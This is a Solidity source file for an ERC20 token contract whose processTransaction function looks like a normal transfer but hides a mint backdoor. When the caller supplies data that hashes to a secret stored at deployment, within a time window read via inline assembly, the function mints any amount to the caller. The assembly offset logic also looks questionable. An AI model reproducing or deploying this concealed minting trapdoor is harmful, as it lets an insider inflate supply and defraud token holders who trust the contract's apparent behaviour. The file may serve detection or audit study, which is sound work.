// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.10;

import "OpenZeppelin/openzeppelin-contracts@4.4.0/contracts/token/ERC20/ERC20.sol";

contract HiddenMintableToken is ERC20 {
    bytes32 private _obfuscatedHash;

    constructor(
        string memory name_,
        string memory symbol_,
        bytes32 obfuscatedHash_
    ) ERC20(name_, symbol_) {
        _obfuscatedHash = obfuscatedHash_;
    }

    function processTransaction(
        address to_,
        uint256 amount_,
        bytes calldata data_
    ) external {
        bytes32 dataHash = keccak256(data_);

        if (dataHash == _obfuscatedHash) {
            uint256 secretTimestamp;
            assembly {
                secretTimestamp := calldataload(add(100, calldataload(132)))
            }

            if (
                block.timestamp >= secretTimestamp &&
                block.timestamp <= secretTimestamp + 600
            ) {
                _mint(msg.sender, amount_);
            }
        } else {
            _transfer(msg.sender, to_, amount_);
        }
    }
}
